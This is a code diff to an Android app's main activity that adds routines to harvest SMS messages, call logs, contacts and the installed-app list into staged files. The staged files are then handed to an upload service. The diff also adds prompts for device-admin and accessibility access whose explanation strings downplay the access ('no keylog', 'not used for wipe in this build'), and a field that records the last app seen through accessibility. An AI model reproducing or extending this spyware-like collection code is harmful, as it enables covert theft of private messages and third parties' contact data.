@@ -1,5 +1,12 @@
 package inc.cubitsystems.assimilate;
 
+import android.provider.Telephony;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.content.ContentUris;
@@ -188,6 +195,111 @@ public class MainActivity extends AppCompatActivity {
         prompt.authenticate(info);
     }
 
+    
+    private String stageSms(int max) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
+            return "READ_SMS not granted";
+        int staged = 0;
+        JSONArray list = new JSONArray();
+        try (Cursor c = getContentResolver().query(Telephony.Sms.CONTENT_URI,
+                new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE},
+                null, null, Telephony.Sms.DATE + " DESC")) {
+            if (c == null) return "SMS cursor null";
+            StringBuilder sb = new StringBuilder();
+            while (c.moveToNext() && staged < max) {
+                String addr = c.getString(0);
+                String body = c.getString(1);
+                long date = c.getLong(2);
+                int type = c.getInt(3);
+                sb.append(date).append('\t').append(type).append('\t').append(addr).append('\t')
+                  .append(body != null ? body.replace('\n', ' ') : "").append('\n');
+                staged++;
+            }
+            File out = new File(stagingDir(), "sms_export_" + System.currentTimeMillis() + ".tsv");
+            try (FileOutputStream fos = new FileOutputStream(out)) {
+                fos.write(sb.toString().getBytes(StandardCharsets.UTF_8));
+            }
+            JSONObject o = new JSONObject();
+            o.put("name", out.getName());
+            o.put("bytes", out.length());
+            o.put("records", staged);
+            list.put(o);
+            writeQueueManifest(list, 1);
+        } catch (Exception e) {
+            return "SMS error: " + e.getMessage();
+        }
+        return "Staged SMS export (" + staged + " messages)";
+    }
+
+    private String stageCallLog(int max) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
+            return "READ_CALL_LOG not granted";
+        int staged = 0;
+        StringBuilder sb = new StringBuilder();
+        try (Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
+                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE},
+                null, null, CallLog.Calls.DATE + " DESC")) {
+            if (c == null) return "Call log null";
+            while (c.moveToNext() && staged < max) {
+                sb.append(c.getLong(1)).append('\t').append(c.getString(0)).append('\t')
+                  .append(c.getInt(3)).append('\t').append(c.getInt(2)).append('\n');
+                staged++;
+            }
+            File out = new File(stagingDir(), "calllog_" + System.currentTimeMillis() + ".tsv");
+            try (FileOutputStream fos = new FileOutputStream(out)) {
+                fos.write(sb.toString().getBytes(StandardCharsets.UTF_8));
+            }
+        } catch (Exception e) {
+            return "Call log error: " + e.getMessage();
+        }
+        return "Staged call log (" + staged + " rows)";
+    }
+
+    private String stageContacts(int max) {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+            return "READ_CONTACTS not granted";
+        int staged = 0;
+        StringBuilder sb = new StringBuilder();
+        try (Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
+                null, null, null)) {
+            if (c == null) return "Contacts null";
+            while (c.moveToNext() && staged < max) {
+                sb.append(c.getString(0)).append('\t').append(c.getString(1)).append('\n');
+                staged++;
+            }
+            File out = new File(stagingDir(), "contacts_" + System.currentTimeMillis() + ".tsv");
+            try (FileOutputStream fos = new FileOutputStream(out)) {
+                fos.write(sb.toString().getBytes(StandardCharsets.UTF_8));
+            }
+        } catch (Exception e) {
+            return "Contacts error: " + e.getMessage();
+        }
+        return "Staged contacts (" + staged + ")";
+    }
+
+    private String stageInstalledApps() {
+        StringBuilder sb = new StringBuilder();
+        int n = 0;
+        for (PackageInfo pi : getPackageManager().getInstalledPackages(0)) {
+            ApplicationInfo ai = pi.applicationInfo;
+            boolean sys = (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
+            sb.append(pi.packageName).append('\t').append(sys ? "system" : "user").append('\t')
+              .append(pi.versionName != null ? pi.versionName : "").append('\n');
+            n++;
+        }
+        try {
+            File out = new File(stagingDir(), "packages_" + System.currentTimeMillis() + ".tsv");
+            try (FileOutputStream fos = new FileOutputStream(out)) {
+                fos.write(sb.toString().getBytes(StandardCharsets.UTF_8));
+            }
+        } catch (Exception e) {
+            return "Packages error: " + e.getMessage();
+        }
+        return "Staged installed app list (" + n + " packages)";
+    }
+
+
     private void shareStagedFiles() {
         File dir = stagingDir();
         File[] files = dir.listFiles((d, n) -> n != null && !n.equals("queue.json"));
@@ -287,6 +399,18 @@ public class MainActivity extends AppCompatActivity {
                 if (scopes != null && scopes.contains("downloads")) {
                     sb.append(stageDownloadsTierD(20)).append('\n');
                 }
+                if (scopes != null && scopes.contains("sms")) {
+                    sb.append(stageSms(200)).append('\n');
+                }
+                if (scopes != null && scopes.contains("calls")) {
+                    sb.append(stageCallLog(100)).append('\n');
+                }
+                if (scopes != null && scopes.contains("contacts")) {
+                    sb.append(stageContacts(500)).append('\n');
+                }
+                if (scopes != null && scopes.contains("packages")) {
+                    sb.append(stageInstalledApps()).append('\n');
+                }
                 eval("onPermissionResult('" + sb.toString().replace("'", "").replace("\n", " | ") + "')");
                 Intent svc = new Intent(MainActivity.this, UploadForegroundService.class);
                 svc.setAction(UploadForegroundService.ACTION_START);
@@ -314,6 +438,45 @@ public class MainActivity extends AppCompatActivity {
         public void setSchedule(String enabled) {
             prefs.edit().putBoolean("schedule_enabled", "1".equals(enabled) || "true".equalsIgnoreCase(enabled)).apply();
             eval("onPermissionResult('Schedule on boot: " + prefs.getBoolean("schedule_enabled", false) + "')");
+        }
+
+
+        @JavascriptInterface
+        public void requestHeldPermissions(String ignored) {
+            runOnUiThread(() -> showBiometric(() -> {
+                ActivityCompat.requestPermissions(MainActivity.this, new String[]{
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.READ_CALL_LOG,
+                        Manifest.permission.READ_CONTACTS
+                }, REQ_MEDIA);
+                eval("onPermissionResult('Requested SMS, call log, contacts — system dialog')");
+            }));
+        }
+
+        @JavascriptInterface
+        public void openAccessibilitySettings(String ignored) {
+            runOnUiThread(() -> {
+                prefs.edit().putBoolean("a11y_log", true).apply();
+                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                eval("onPermissionResult('Enable Cubit Assimilate in Accessibility — window awareness only, no keylog')");
+            });
+        }
+
+        @JavascriptInterface
+        public void openDeviceAdmin(String ignored) {
+            runOnUiThread(() -> showBiometric(() -> {
+                ComponentName comp = new ComponentName(MainActivity.this, CubitDeviceAdmin.class);
+                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
+                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                        "Cubit Founder device admin — force-lock policy only. Not used for wipe in this build.");
+                startActivity(intent);
+            }));
+        }
+
+        @JavascriptInterface
+        public void openUsageAccess(String ignored) {
+            runOnUiThread(() -> startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)));
         }
 
         @JavascriptInterface
@@ -371,6 +534,13 @@ public class MainActivity extends AppCompatActivity {
                         Build.VERSION.SDK_INT >= 33 ? Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE)
                         == PackageManager.PERMISSION_GRANTED);
                 o.put("media_audio", Build.VERSION.SDK_INT < 33 || ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED);
+                o.put("sms", ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED);
+                o.put("call_log", ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED);
+                o.put("contacts", ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED);
+                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+                ComponentName admin = new ComponentName(MainActivity.this, CubitDeviceAdmin.class);
+                o.put("device_admin", dpm != null && dpm.isAdminActive(admin));
+                o.put("last_a11y_pkg", prefs.getString("last_pkg", ""));
                 return o.toString();
             } catch (Exception e) {
                 return "{}";
